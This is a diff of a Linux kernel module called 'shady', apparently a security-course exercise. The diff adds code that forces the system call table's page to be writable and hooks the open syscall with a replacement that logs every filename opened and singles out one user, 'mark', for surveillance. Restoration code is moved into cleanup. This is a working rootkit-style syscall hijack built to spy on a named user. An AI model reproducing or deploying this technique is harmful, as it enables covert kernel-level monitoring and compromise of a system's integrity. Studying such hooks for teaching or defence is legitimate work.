@@ -48,7 +48,7 @@ module_param(shady_ndevices, int, S_IRUGO);
 static unsigned int shady_major = 0;
 static struct shady_dev *shady_devices = NULL;
 static struct class *shady_class = NULL;
-static unsigned long system_call_table_address = 0xffffffff81801400LL;
+static unsigned long system_call_table_address = 0xffffffff81801400;
 static int marks_uid = 1001;
 /* ================================================================ */
 
@@ -186,12 +186,38 @@ shady_destroy_device(struct shady_dev *dev, int minor,
   return;
 }
 
+static void set_addr_rw(unsigned long addr) {
+  unsigned int level;
+  pte_t *pte = lookup_address(addr, &level);
+  if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
+}
+
+asmlinkage int (*old_open) (const char*, int, int);
+
+asmlinkage int my_open (const char* file, int flags, int mode) 
+{
+  unsigned int current_user_id;
+  current_user_id = get_current_user()->uid.val;
+  printk("My open is being called %s\n", file);
+  if (current_user_id == marks_uid) {
+    // spy
+    printk("mark is about to open\n");
+  }
+
+  // Call the original open syscall
+  return old_open(file, flags, mode);
+}
+
 /* ================================================================ */
 static void
 shady_cleanup_module(int devices_to_destroy)
 {
   int i;
 	
+  // Restore the original "open" syscall
+  void** system_call_table = (void**) system_call_table_address;
+  system_call_table[__NR_open] = old_open;  
+
   /* Get rid of character devices (if any exist) */
   if (shady_devices) {
     for (i = 0; i < devices_to_destroy; ++i) {
@@ -207,29 +233,6 @@ shady_cleanup_module(int devices_to_destroy)
    * has failed. */
   unregister_chrdev_region(MKDEV(shady_major, 0), shady_ndevices);
   return;
-}
-
-static void set_addr_rw(unsigned long addr) {
-  unsigned int level;
-  pte_t *pte = lookup_address(addr, &level);
-  if (pte->pte &~ _PAGE_RW) 
-    pte->pte |= _PAGE_RW;
-}
-
-asmlinkage int (*old_open) (const char*, int, int);
-
-asmlinkage int my_open (const char* file, int flags, int mode) 
-{
-  unsigned int current_user_id;
-  current_user_id = get_current_user()->uid.val;
-  printk("My open is being called\n");
-  if (current_user_id == marks_uid) {
-    // spy
-    printk("mark is about to open\n");
-  }
-
-  // Call the original open syscall
-  return old_open(file, flags, mode);
 }
 
 static int __init
@@ -301,10 +304,6 @@ shady_init_module(void)
 static void __exit
 shady_exit_module(void)
 {
-  // Restore the original "open" syscall
-  void** system_call_table = (void**) system_call_table_address;
-  system_call_table[__NR_open] = old_open;  
-
   shady_cleanup_module(shady_ndevices);
   return;
 }
